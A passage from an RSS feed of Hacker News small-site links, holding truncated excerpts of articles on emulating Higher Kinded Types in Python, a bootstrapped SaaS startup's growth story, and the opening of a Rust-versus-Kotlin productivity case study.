            <link>https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55</link>
            <guid isPermaLink="false">hacker-news-small-sites-24940075</guid>
            <pubDate>Fri, 30 Oct 2020 08:02:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Higher Kinded Types in Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939974">thread link</a>) | @lukastyrychtr
<br/>
October 30, 2020 | https://sobolevn.me/2020/10/higher-kinded-types-in-python | <a href="https://web.archive.org/web/*/https://sobolevn.me/2020/10/higher-kinded-types-in-python">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p><img src="https://dev-to-uploads.s3.amazonaws.com/i/73uvh47fvxfveqpz2xgi.png" alt="Cover image"></p>

<p><code>dry-python/returns@0.15</code> is <a href="https://github.com/dry-python/returns/releases/tag/0.15.0">released</a>! And it means that now anyone can use our Higher Kinded Types emulation in their projects.</p>

<p>In this post I will explain:</p>
<ul>
  <li>What Higher Kinded Types (HKTs) are and why they are useful</li>
  <li>How they are implemented and what limitations there are</li>
  <li>How can you use them in your own projects</li>
</ul>

<p>Without further ado, let’s talk about typing!</p>


      <h2 id="simple-types">
        
        <a href="#simple-types">Simple types</a>
        
      </h2>

<p>Typing is layered. Like a good cake. There are at least three layers that we are going to cover.</p>

<p>Simple (or flat) typing, like <code>x: int = 1</code>. This allows us to express simple types and their transformations. Like <code>int -&gt; str</code>:</p>

<div><div><pre><code><span>def</span> <span>stringify</span><span>(</span><span>arg</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>str</span><span>:</span>
    <span>return</span> <span>str</span><span>(</span><span>arg</span><span>)</span>
</code></pre></div></div>

<p>A lot of languages like <code>go</code> and <code>php</code> do not go beyond this line. And they still work pretty well! These types are also sometimes called <code>*</code>-kinded. It can be understood as “a place for just a single type argument”.</p>


    
      <h2 id="generic">
        
        <a href="#generic">Generic</a>
        
      </h2>

<p>Generic level is required to express “nested” types. For example, you have a list of integers. In Python we annotate it as <code>List[int]</code> or <a href="https://www.python.org/dev/peps/pep-0585/"><code>list[int]</code></a> in Python <code>3.9</code>. This allows us to have types with other types as arguments. <code>List</code> can receive <code>int</code> or <code>str</code> or even another <code>List</code> as the type argument. This way we can nest type and types start to have their own structure.</p>

<p>Generics are much more interesting than simple types. And they can have multiple type arguments:</p>
<ul>
  <li>List has one: for values, so it has a kind of <code>* -&gt; *</code>. It can be understood as a type transformation <code>List -&gt; T = List[T]</code></li>
  <li>Dict has two: for keys and values, so it has a kind of <code>* -&gt; * -&gt; *</code>. It can be understood as a type transformation <code>Dict -&gt; K -&gt; V = Dict[K, V]</code></li>
  <li>And so on!</li>
</ul>

<p>This would be very helpful for us in the future, I promise.</p>

<p>We can also write transformations for generic types:</p>

<div><div><pre><code><span>def</span> <span>stringify_list_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>[</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>]</span>
</code></pre></div></div>

<p>But, that is where things begin to be quite complicated.</p>

<p>How can this function work with other iterables like <code>set</code>, <code>frozenset</code>, <code>tuple</code>?
We can express this in Python as easy as:</p>

<div><div><pre><code><span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>But the typing part would be quite challenging. Let’s try several things.</p>


    
      <h3 id="common-interface">
        
        <a href="#common-interface">Common interface</a>
        
      </h3>

<p>The first obvious thing to try is <code>Iterable</code> protocol. It is builtin into Python and does what we need.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Iterable</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Iterable</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s try it out:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]))</span>
<span># Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>}))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span></code></pre></div></div>

<p>You can see that a part of our typing information is lost. We pass <code>List</code> or <code>Set</code> or <code>Tuple</code> and always get the <code>Iterable</code> back.</p>

<p>Sometimes - this is ok. But, in some cases, this is not enough. Let’s try some other technique!</p>


    
      <h3 id="methods">
        
        <a href="#methods">Methods</a>
        
      </h3>

<p>One can say: we are all using Object-Oriented Programming! Why cannot we just create a new method for each type we need? And specify the exact return type there!</p>

<p>Well, it is a possible solution. But, there are some reasonable problems:</p>

<ul>
  <li>You cannot add methods to existing types and extend them with this approach. Only create new ones, probably via subtyping, and add new methods there. In our example you would have to create your own versions of <code>List</code>, <code>Set</code>, and <code>Tuple</code>. Which is not desirable in most situations</li>
  <li>It really starts to be messy if you have a lot of methods to add. A type with more than <code>X</code> (choose the number yourself) methods starts to be really complex to read, understand, and use. Instead, using separate functions is much easier, because we don’t have to put everything into a single namespace</li>
</ul>

<p>Let’s try something else.</p>


    
      <h3 id="overloads">
        
        <a href="#overloads">overloads</a>
        
      </h3>

<p>Another solution that might solve our problem is using the <code>@overload</code> decorator with proper types for each required case.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>List</span><span>,</span> <span>Set</span><span>,</span> <span>overload</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Set</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Set</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s test it:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span></code></pre></div></div>

<p>Awesome! Looks like we’ve achieved our goal, haven’t we? But, there’s a new problem. We have to manually list all possible cases in a function’s signature. This works for cases when all possible arguments and outcomes are known in advance. But, not in this case. In Python <code>Iterable</code> is a protocol. We can use this function with any type with <code>__iter__</code> method defined: with both builtin and custom types. So, the number of possible arguments and outcomes is endless.</p>

<p>To illusrate the problem, let’s see what happens for <code>Tuple</code> which is not listed in the function’s overloads:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span># error: No overload variant of "stringify_iterable_items" matches argument type "Tuple[int, int, int]"
</span></code></pre></div></div>

<p>We, in <code>dry-python</code> <a href="https://github.com/dry-python/returns/blob/0.14.0/returns/_generated/converters/flatten.pyi">used this technique</a> with <code>@overload</code> decorator for our previous versions. This allowed us to write correct definitions of functions working with generic types. But, they were limited to the pre-defined set of our own types. And we wanted to allow our users to create their custom types based on our interfaces. With the full existing code reuse.</p>


    
      <h2 id="higher-kinded-types">
        
        <a href="#higher-kinded-types">Higher Kinded Types</a>
        
      </h2>

<p>That’s where the idea of Higher Kinded Types becomes useful. We need HKTs when we want to change the inner structure of generics with full type information preserving and openness to the extension. In theory, you can write something like:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>T</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'T'</span><span>,</span> <span>bound</span><span>=</span><span>Iterable</span><span>)</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>T</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>And this would solve our problem! What happens here is that we abstract away the <code>Iterable</code> type itself. And then ask <code>mypy</code> to figure this out for us.</p>

<p>This way we can potentially have <code>stringify_iterable_items</code> working for any <code>Iterable</code> type, but with the exact same type returned back without any information lost. And it would work for all types.</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>(</span><span>MyCustomIterable</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)))</span>
<span># Revealed type is 'my_module.MyCustomIterable[builtins.str]'
</span></code></pre></div></div>

<p>Unfortunately, <a href="https://github.com/python/typing/issues/548">it is not supported</a> at the moment.</p>


    
      <h3 id="emulation">
        
        <a href="#emulation">Emulation</a>
        
      </h3>

<p>Turns out we are not alone in this situation. There are multiple languages where Higher Kinded Types are not natively supported yet. But, they can be emulated:</p>

<ul>
  <li><a href="https://github.com/gcanti/fp-ts/blob/master/docs/guides/HKT.md">TypeScript</a></li>
  <li><a href="https://bow-swift.io/docs/fp-concepts/higher-kinded-types/">Swift</a></li>
  <li><a href="https://arrow-kt.io/docs/0.10/patterns/glossary/#higher-kinds">Kotlin</a></li>
</ul>

<p>And now with <a href="https://returns.readthedocs.io/en/latest/pages/hkt.html">Python</a> too!</p>

<p>There’s also <a href="https://www.cl.cam.ac.uk/~jdy22/papers/lightweight-higher-kinded-polymorphism.pdf">an original whitepaper</a> for ones who are interested.</p>

<p>The core idea of HKT emulation is that we can write types the other way around: not like <code>T[int]</code>, but rather like <code>Kind[T, int]</code> (which is absolutely the same thing).</p>

<p>This way we can transform the inner structure of generics, but maintain the simple context without reinventing <code>TypeVar</code> with type arguments. And our function’s type signature will look like: <code>Kind[T, int] -&gt; Kind[T, str]</code>.</p>

<p>Let’s see the implementation.</p>


    
      <h2 id="implementation">
        
        <a href="#implementation">Implementation</a>
        
      </h2>

<p><strong>TLDR</strong>: here’s <a href="https://gist.github.com/sobolevn/7f8ffd885aec70e55dd47928a1fb3e61">the final working code</a> with all the logic, all the hacks, and everything. In this article, we going to write and explain it step by step.</p>

<p>We would need a better example to test our implementation. Let’s build two types: a <code>Box</code> and a <code>Bag</code>. <code>Box</code> is defined by its size, while a <code>Bag</code> is an item of fashion: it has a brand name and a model name (I have a wife, I know this stuff!).</p>

<div><div><pre><code><span>from</span> <span>dataclasses</span> <span>import</span> <span>dataclass</span>
<span>from</span> <span>typing</span> <span>import</span> <span>Callable</span><span>,</span> <span>Generic</span><span>,</span> <span>TypeVar</span>

<span>_ValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_ValueType'</span><span>)</span>
<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Box</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>length</span><span>:</span> <span>int</span>
    <span>width</span><span>:</span> <span>int</span>
    <span>height</span><span>:</span> <span>int</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Bag</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>brand</span><span>:</span> <span>str</span>
    <span>model</span><span>:</span> <span>str</span>
</code></pre></div></div>

<p>And we can create <code>Box</code>es and <code>Bag</code>s of different types, because we can put different things inside them:</p>

<div><div><pre><code><span>box</span> <span>=</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>10</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>  <span># Box[int]
</span><span>bag</span> <span>=</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>5</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>  <span># Bag[int]
</span></code></pre></div></div>

<p>Now, we need a function with a type transformation. Let’s say we want to apply a function to the value inside boxes and bags. Let’s use fake <code>BoxOrBag</code> type for now to illustrate our intent:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Callable</span>

<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>BoxOrBag</span><span>[</span><span>_ValueType</span><span>],</span>  <span># fake type for now
</span>    <span>callback</span><span>:</span> <span>Callable</span><span>[[</span><span>_ValueType</span><span>],</span> <span>_NewValueType</span><span>],</span>
<span>)</span> <span>-&gt;</span> <span>BoxOrBag</span><span>[</span><span>_NewValueType</span><span>]:</span>  <span># fake type for now
</span>    <span>...</span>
</code></pre></div></div>

<p>It is going to work like so:</p>

<div><div><pre><code><span>assert</span> <span>apply_function</span><span>(</span><span>box</span><span>,</span> <span>str</span><span>)</span> <span>==</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>'10'</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>
<span>assert</span> <span>apply_function</span><span>(</span><span>bag</span><span>,</span> <span>bool</span><span>)</span> <span>==</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>True</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>
</code></pre></div></div>

<p>We only need to change current fake <code>BoxOrBag</code> type to a real HKT. We would need to define a new <code>Kind</code> type to make the emulation:</p>

<div><div><pre><code><span>_InstanceType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>
<span>_FirstTypeArgType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_FirstTypeArgType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>

<span>class</span> <span>Kind</span><span>(</span><span>Generic</span><span>[</span><span>_InstanceType</span><span>,</span> <span>_FirstTypeArgType</span><span>]):</span>
    <span>"""Used for HKT emulation."""</span>
</code></pre></div></div>

<p>One pro-tip about <code>Kind</code>: it won’t not exist during runtime. Only during type-checking.</p>

<p>Now, let’s change <code>apply_function</code> to use <code>Kind</code>:</p>

<div><div><pre><code><span>_InstanceKind</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceKind'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>Kind</span><span>[</span><span>_InstanceKind</span><span>,</span> <span>_ValueType</span><span>],</span>
    <span>callback</span><span>:</span> <span>Callable</span>…</code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sobolevn.me/2020/10/higher-kinded-types-in-python">https://sobolevn.me/2020/10/higher-kinded-types-in-python</a></em></p>]]>
            </description>
            <link>https://sobolevn.me/2020/10/higher-kinded-types-in-python</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939974</guid>
            <pubDate>Fri, 30 Oct 2020 07:40:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2 People, No VC Money, $700k+ ARR in Less Than 3 Years]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939911">thread link</a>) | @yosid
<br/>
October 30, 2020 | https://provesrc.com/blog/celebrating-3-years/ | <a href="https://web.archive.org/web/*/https://provesrc.com/blog/celebrating-3-years/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><strong>TLDR:</strong> Stories and takeaways from growing ProveSource from 0 to $700k ARR as a 2-person team in less than 3 years and with no funding.</p>
<p><img loading="lazy" src="https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover.png" alt="3 year story provesource" width="1920" height="1080" srcset="https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover.png 1920w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-300x169.png 300w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-1024x576.png 1024w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-768x432.png 768w, https://provesrc.com/blog/wp-content/uploads/2020/10/3-year-story-cover-1536x864.png 1536w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<h2><strong>Our false start</strong></h2>
<p>We started the company in June 2015 with no real idea.</p>
<p>Most people we know fail to ever get started because they’re looking for the perfect idea.</p>
<p>As the founder of Instagram famously said:</p>
<p>“It’s about going through false starts. The best companies in the world have all had predecessors. YouTube was a dating site. You always have to evolve into something else.”</p>
<p>We brainstormed for several days and because both myself and Natan (my co-founder) are very good with mobile app development (iOS &amp; Android) we decided to build a personalization platform for mobile apps and sell it to enterprises.</p>
<p>Around 2.5 years later, having invested almost $100k out of our own pockets, having done hundreds of calls and demos with huge enterprises and dozens of Proof of Concepts, we decided it’s time to move on…</p>
<p>It felt awful – like you’re killing something you love, but it had to be done.</p>
<p>That was our “false start”. But more on that another time.</p>
<p><strong>🧠 Lesson learned:</strong></p>
<p>The sooner you kill an idea that is getting no traction, even if it’s super hard because it’s your baby, the less painful it is. The more time and resources you devote, the harder it becomes to pull out in case things don’t work out.</p>
<h2><strong>Starting over – The lean way</strong></h2>
<p>In January 2018 we decided to start working on a new SaaS product.</p>
<p>The idea was to “steal” the social proof hack that Booking.com was using (e.g. 5 people booked this hotel, etc.) and create a platform from it – a social proof marketing platform.</p>
<p>This time, because we were running on fumes, both in terms of cash and motivation, we decided to validate the idea first.</p>
<p>We had a single purpose in mind – getting 100 leads interested in our product.</p>
<p>We created a landing page that showcased our new idea as a real product, including pricing, a signup button, and all – a social proof marketing platform for mobile apps.</p>
<p><img loading="lazy" src="https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps.png" alt="" width="1920" height="1080" srcset="https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps.png 1920w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-300x169.png 300w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-1024x576.png 1024w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-768x432.png 768w, https://provesrc.com/blog/wp-content/uploads/2020/10/landing-page-for-product-validation-ps-1536x864.png 1536w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<p>The fastest way to get targeted traffic to your website is to use Google Ads targeting the brand names of the biggest players in your niche.</p>
<p>So we did that.</p>
<p>We also posted the landing page anywhere we could think of: Reddit, ProductHunt, BetaList, social media, wherever…</p>
<p>About one month and – $300 later, we had around 200 leads that wanted to try out ProveSource.</p>
<p>We were finally making progress!</p>
<p>We figured that even if only 1% of them converted, we would already have 2 paying customers.</p>
<p><strong>🧠 Lesson learned:</strong></p>
<p>You can easily get traction without having a product.</p>
<p>Just buy a domain, build a landing page, and go validate your business idea.</p>
<p>We usually create landing pages to validate products using plain HTML and Airtable, to send the leads we collect from the forms. No fancy designs, no expensive CRM.</p>
<h2><strong>Making our first dollar $</strong></h2>
<p>Next goal – how do we make a dollar?</p>
<p>That is, unlike our previous product which made practically $0 in 2.5 years.</p>
<p>We created a rule that whenever we launch a new product, all our efforts will be towards making our first dollar, so we can have real-life validation.</p>
<p>So we have 200 people interested in ProveSource.</p>
<p>Now we needed to give them a product and get them to pay.</p>
<p>We built the leanest MVP possible:</p>
<ul>
<li>A product just for website owners (mobile was too small of a niche).</li>
<li>You could only show how many page visitors you had on your website.</li>
<li>The whole UI and UX should be super simple. No menus and extra buttons, don’t give users a reason to abandon your product.</li>
</ul>
<p>Did you forget your password and need to reset it? Sorry, no can do.</p>
<p>Did we accidentally change your password when you logged in? Oops, we’re on it.</p>
<p>What are onboarding and email automation? Dunno, don’t care.</p>
<p>April 2018 – we are approached by a Facebook Group admin that is interested in promoting our product to his group as a “lifetime deal” (LTD).</p>
<p>This means selling a lifetime subscription to your product for a one-off payment ranging from $39-$99.</p>
<p>We’ve never heard of this before so we thought long and hard about the consequences of selling a lifetime deal and how it would position the product and our company…</p>
<p>We decided to go with the deal and ran it with the group for 1 week.</p>
<p>We generated over $7k revenue, got tons of feedback, ideas for product improvements, tons of bugs were discovered in the process, which taught us the value of having live chat support.</p>
<p><strong>🧠 Lesson learned:</strong></p>
<p>In hindsight, there were no real consequences, only advantages to running a lifetime deal.</p>
<p>Sure, you have a few dozens of customers that are not paying you on a recurring basis – but they help a lot in the beginning when you need the cash and the validation.</p>
<p>Once we were done with the LTD we started pushing the product in all marketing channels and to our 200 user waiting list. None of them converted by the way.</p>
<p>A couple of days later we got our first monthly subscription customer ($19/month).</p>
<p>It was an amazing moment, validating that you indeed have a real business opportunity in your hands.</p>
<h2><strong>Our “wow moment”</strong></h2>
<p>During the next months, we focused on spreading the word, squashing bugs, and doing tons of support for our existing customers.</p>
<p>How did we decide what to build next?</p>
<ul>
<li>We learned to ask questions about our product’s value. Why do people buy our product? Is it because they want to increase conversions? How do we help them achieve that?</li>
<li>We brainstormed about what it means to be a social proof platform.</li>
<li>We heard our customers’ feedback</li>
<li>We learned from competitors; but not too much. We found that those who only copy will always lag behind.</li>
</ul>
<p>This whole process has to be accompanied by analytics and metrics.</p>
<p>You don’t have to measure each and every step or A/B test you do, though.</p>
<p>We don’t really do it, to this day.</p>
<p>A lot of product leaders talk about the “wow effect” or “wow moment” – if you want to retain users, make them say “wow”.</p>
<p>For Facebook, for example, their “wow moment” is logging into their platform and seeing familiar faces. That’s why they make sure that during sign up, you connect with as many people you know on Facebook as possible.</p>
<p>In our case, we focused on improving our user onboarding.</p>
<p>Since the product requires users to install a javascript snippet on their website, we put a big emphasis on making that process as easy as possible.</p>
<p>Our thought was – if users can see a social proof notification on their website, they’ll get to that “wow moment”.</p>
<p>We can see a very close correlation between successful onboarding and someone becoming a paying customer.</p>
<p>The funnel looks like this:</p>
<ul>
<li>8-10% of visitors will signup.</li>
<li>70% of those signups will complete the onboarding.</li>
<li>7-10% of those users who are onboarded will eventually become paying customers.</li>
</ul>
<p><img loading="lazy" src="https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel.png" alt="ProveSource Signups Funnel" width="1920" height="1080" srcset="https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel.png 1920w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-300x169.png 300w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-1024x576.png 1024w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-768x432.png 768w, https://provesrc.com/blog/wp-content/uploads/2020/10/ProveSource-Signups-Funnel-1536x864.png 1536w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"></p>
<p><strong>🧠 Lesson learned:</strong></p>
<p>Find what your “wow moment” is in your users’ experience, and make sure you get users to experience it as early in the onboarding process as possible. That way you can spend a lot on User Acquisition activities because the users you bring in end up becoming paying customers and sticking with you.</p>
<h2><strong>Our First Growth “Hack”</strong></h2>
<p>After we added some “necessary” features like showing recent sales and polishing the product to have fewer bugs – we wanted to grow bigger, we wanted to scale up, we wanted to get more exposure.</p>
<p>How do you scale a notifications product that is essentially an add-on for websites?</p>
<p>You build integrations for all website builders.</p>
<p>So we worked hard on adding more and more integrations: <a href="https://wordpress.org/plugins/provesource/">WordPress plugin</a>, <a href="https://apps.shopify.com/provesource">Shopify app</a>, Magento plugin, Wix app, <a href="https://zapier.com/apps/provesource/integrations">Zapier</a>, <a href="https://www.bigcommerce.com/apps/provesource-social-proof/">BigCommerce</a>, and more.</p>
<p>All of these marketplaces and app stores proved to be really good traffic sources and traction channels for us, each with its own audience and unique requirements.</p>
<p>Today, around 20% of our customers and revenue comes from Shopify alone.</p>
<h2><strong>Scaling past 2 people</strong></h2>
<p>Being a two-person team that does development, marketing, support, accounting, and more is tough. But it also teaches you a lot, you learn so much about your business, your audience, and your customers.</p>
<p>And that gives you the experience you need on what to look for when hiring someone to take over some of your responsibilities.</p>
<p>In September 2019 we decided it’s time to scale the team.</p>
<p>After all, a great company can’t be just 2 people, right?</p>
<p>Naturally, a software company’s first hire would be a developer.</p>
<p>Bringing Dima to the team, allowed us to build more integrations faster, and scale the company beyond its initial stage.</p>
<p>So we now have tons of integrations, pretty much with any large marketing or website platform out there.</p>
<p>We also scaled and optimized our Google and Facebook ads as much as we could.</p>
<p>We optimized our product onboarding rate, increased prices, added great features, and made it even easier to use the product, by adding tooltips, auto-suggestions, wizards, and more.</p>
<p>We were growing at a steady rate, so what could possibly be bothering us?</p>
<p>Well, we didn’t know how to grow faster, or what to do next.</p>
<p>We came up with a few ideas:</p>
<ul>
<li>Bring a Growth team member to scale our marketing efforts and bring new ideas to the table.</li>
<li>Since our product offering is strong and we couldn’t think about any impactful feature we could develop – we thought about zooming out of our product’s initial market.</li>
<li>Build a new product – we have no investors so we are free to make any decision we want about the company’s direction. Investors often block the founders from doing whatever is best for the company and push for a point where they can exit.</li>
</ul>
<h2><strong>Building a new product</strong></h2>
<p>At this point, we decided to build another product to scale the company further.</p>
<p>We had these questions in mind before picking what to work on:</p>
<ul>
<li>How big is the market, is it potentially bigger than our current product?</li>
<li>Would our existing customers be customers of this new product too?</li>
<li>What do our existing customers need and are willing to pay for?</li>
</ul>
<p>Adding ProveSource to your website is great, but, there is a critical prerequisite to making it work for you and your website: traffic. If your website has no traffic, you won’t be able to generate social proof.</p>
<p>Here’s the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://provesrc.com/blog/celebrating-3-years/">https://provesrc.com/blog/celebrating-3-years/</a></em></p>]]>
            </description>
            <link>https://provesrc.com/blog/celebrating-3-years/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939911</guid>
            <pubDate>Fri, 30 Oct 2020 07:21:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For Complex Applications, Rust Is as Productive as Kotlin]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 21 (<a href="https://news.ycombinator.com/item?id=24939875">thread link</a>) | @quyleanh
<br/>
October 30, 2020 | https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/ | <a href="https://web.archive.org/web/*/https://ferrous-systems.com/blog/rust-as-productive-as-kotlin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="preamble">
<div>
<p>In this article, we will compare one apple (IntelliJ Rust) to one orange (rust-analyzer) to reach general and sweeping conclusions.
Specifically, I want to present a case study supporting the following claim:</p>
<p>For complex applications, Rust is as productive as Kotlin.</p>
<p>For me, this is an unusual claim to argue: I always thought exactly the opposite, but I am not so sure now.
I came to Rust from C++.
I was of the opinion that this is a brilliant low-level language and always felt puzzled at people writing higher-level things in Rust.
Clearly, choosing Rust means taking a productivity hit, and using Kotlin, C# or Go just makes much more sense if you can afford GC.
My <a href="https://matklad.github.io/2020/09/20/why-not-rust.html">list of Rust criticisms</a> starts with this objection.</p>
<p>What moved my position in the other direction was my experience as the lead developer of rust-analyzer and IntelliJ Rust.
Let me introduce the two projects.</p>
<p><a href="https://github.com/intellij-rust/intellij-rust"><strong>IntelliJ Rust</strong></a> is the plugin for IntelliJ Platform, providing Rust support.
In effect, it is a Rust compiler front-end, written in Kotlin and making use of language-support features of the platform.
These features include lossless syntax trees, a parser generator, persistence and indexing infrastructure, among others.
